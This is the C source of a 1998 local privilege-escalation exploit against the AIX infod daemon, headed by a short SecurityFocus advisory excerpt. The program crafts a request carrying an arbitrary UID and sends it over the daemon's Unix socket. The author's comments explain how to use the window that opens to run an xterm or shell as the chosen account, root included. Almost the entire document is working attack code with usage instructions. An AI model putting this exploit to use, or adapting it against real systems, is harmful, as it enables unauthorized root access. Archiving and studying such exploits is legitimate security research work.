/*
source: https://www.securityfocus.com/bid/370/info

Certain versions of AIX ship with an Information Daemon, infod. This program is designed to provide information about the OS and installed ancilliary programs. The daemon which runs as root, does not check credentials which are passed to it. This allows users to pass requests with arbitrary UID's. If a user passes infod a request as root, they can goto the default options menu and change the printer command line to an alternate binary such as /bin/sh that gives privileges to the account the session was spawned under.
*/

/* Infod AIX exploit (k) Arisme 21/11/98  - All Rights Reversed
   Based on RSI.0011.11-09-98.AIX.INFOD (http://www.repsec.com)

   Run program with the login you want to exploit :)
   When the window appears, select "options", "defaults", change printer
   to something more useful (like /bin/x11/xterm) and print !

   Comments,questions : arisme@altern.org */


#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <pwd.h>

#define TAILLE_BUFFER 2000
#define SOCK_PATH "/tmp/.info-help"
#define PWD "/tmp"

#define KOPY "Infod AIX exploit (k) Arisme 21/11/98\nAdvisory RSI.0011.11-09-98.AIX.INFOD (http://www.repsec.com)"
#define NOUSER "Use : infofun [login]"
#define UNKNOWN "User does not exist !"
#define OK "Waiting for magic window ... if you have problems check the xhost "

void send_environ(char *var,FILE *param)
{ char tempo[TAILLE_BUFFER];
  int taille;

  taille=strlen(var);
  sprintf(tempo,"%c%s%c%c%c",taille,var,0,0,0);
  fwrite(tempo,1,taille+4,param);
}

main(int argc,char** argv)
{ struct sockaddr_un sin,expediteur;
  struct hostent *hp;
  struct passwd *info;
  int chaussette,taille_expediteur,port,taille_struct,taille_param;
  char buffer[TAILLE_BUFFER],paramz[TAILLE_BUFFER],*disp,*pointeur;
  FILE *param;

  char *HOME,*LOGIN;
  int UID,GID;

  printf("\n\n%s\n\n",KOPY);

  if (argc!=2) { printf("%s\n",NOUSER);
                 exit(1); }


  info=getpwnam(argv[1]);
  if (!info)   { printf("%s\n",UNKNOWN);
                 exit(1); }

  HOME=info->pw_dir;
  LOGIN=info->pw_name;
  UID=info->pw_uid;
  GID=info->pw_gid;

  param=fopen("/tmp/tempo.fun","wb");

  chaussette=socket(AF_UNIX,SOCK_STREAM,0);
  sin.sun_family=AF_UNIX;
  strcpy(sin.sun_path,SOCK_PATH);
  taille_struct=sizeof(struct sockaddr_un);


  if (connect(chaussette,(struct sockaddr*)&sin,taille_struct)<0)
     { perror("connect");
       exit(1); }


  /* 0 0 PF_UID pf_UID 0 0 */

  sprintf(buffer,"%c%c%c%c%c%c",0,0,UID>>8,UID-((UID>>8)*256),0,0);
  fwrite(buffer,1,6,param);

  /* PF_GID pf_GID */
  sprintf(buffer,"%c%c",GID>>8,GID-((GID>>8)*256));
  fwrite(buffer,1,2,param);

  /* DISPLAY (259) */

  bzero(buffer,TAILLE_BUFFER);
  strcpy(buffer,getenv("DISPLAY"));
  fwrite(buffer,1,259,param);

  /* LANG (1 C 0 0 0 0 0 0 0) */

  sprintf(buffer,"%c%c%c%c%c%c%c%c%c",1,67,0,0,0,0,0,0,0);
  fwrite(buffer,1,9,param);

  /* size_$HOME $HOME 0 0 0 */

  send_environ(HOME,param);

  /* size_$LOGNAME $LOGNAME 0 0 0 */

  send_environ(LOGIN,param);

  /* size_$USERNAME $USERNAME 0 0 0 */

  send_environ(LOGIN,param);

  /* size_$PWD $PWD 0 0 0 */

  send_environ(PWD,param);

  /* size_DISPLAY DISPLAY 0 0 0 */

  //send_environ(ptsname(0),param);

  /* If we send our pts, info_gr will crash as it has already changed UID *
/

  send_environ("/dev/null",param);

  /* It's probably not useful to copy all these environment vars but it was
     good for debugging :) */

  sprintf(buffer,"%c%c%c%c",23,0,0,0);
  fwrite(buffer,1,4,param);

  sprintf(buffer,"_=./startinfo");
  send_environ(buffer,param);

  sprintf(buffer,"TMPDIR=/tmp");
  send_environ(buffer,param);

  sprintf(buffer,"LANG=%s",getenv("LANG"));
  send_environ(buffer,param);

  sprintf(buffer,"LOGIN=%s",LOGIN);
  send_environ(buffer,param);

  sprintf(buffer,"NLSPATH=%s",getenv("NLSPATH"));
  send_environ(buffer,param);

  sprintf(buffer,"PATH=%s",getenv("PATH"));
  send_environ(buffer,param);

  sprintf(buffer,"%s","EDITOR=emacs");
  send_environ(buffer,param);

  sprintf(buffer,"LOGNAME=%s",LOGIN);
  send_environ(buffer,param);

  sprintf(buffer,"MAIL=/usr/spool/mail/%s",LOGIN);
  send_environ(buffer,param);

  sprintf(buffer,"HOSTNAME=%s",getenv("HOSTNAME"));
  send_environ(buffer,param);

  sprintf(buffer,"LOCPATH=%s",getenv("LOCPATH"));
  send_environ(buffer,param);

  sprintf(buffer,"%s","PS1=(exploited !) ");
  send_environ(buffer,param);

  sprintf(buffer,"USER=%s",LOGIN);
  send_environ(buffer,param);

  sprintf(buffer,"AUTHSTATE=%s",getenv("AUTHSTATE"));
  send_environ(buffer,param);

  sprintf(buffer,"DISPLAY=%s",getenv("DISPLAY"));
  send_environ(buffer,param);

  sprintf(buffer,"SHELL=%s",getenv("SHELL"));
  send_environ(buffer,param);

  sprintf(buffer,"%s","ODMDIR=/etc/objrepos");
  send_environ(buffer,param);

  sprintf(buffer,"HOME=%s",HOME);
  send_environ(buffer,param);

  sprintf(buffer,"%s","TERM=vt220");
  send_environ(buffer,param);

  sprintf(buffer,"%s","MAILMSG=[YOU HAVE NEW MAIL]");
  send_environ(buffer,param);

  sprintf(buffer,"PWD=%s",PWD);
  send_environ(buffer,param);

  sprintf(buffer,"%s","TZ=NFT-1");
  send_environ(buffer,param);

  sprintf(buffer,"%s","A__z=! LOGNAME");
  send_environ(buffer,param);

  /* Start info_gr with -q parameter or the process will be run locally and
     not from the daemon ... */

  sprintf(buffer,"%c%c%c%c",1,45,113,0);
  fwrite(buffer,1,4,param);

  fclose(param);

  param=fopen("/tmp/tempo.fun","rb");
  fseek(param,0,SEEK_END);
  taille_param=ftell(param);
  fseek(param,0,SEEK_SET);
  fread(paramz,1,taille_param,param);
  fclose(param);

  unlink("/tmp/tempo.fun");

  /* Thank you Mr daemon :) */

  write(chaussette,paramz,taille_param);

  printf("\n%s %s\n",OK,getenv("HOSTNAME"));

  close(chaussette);
}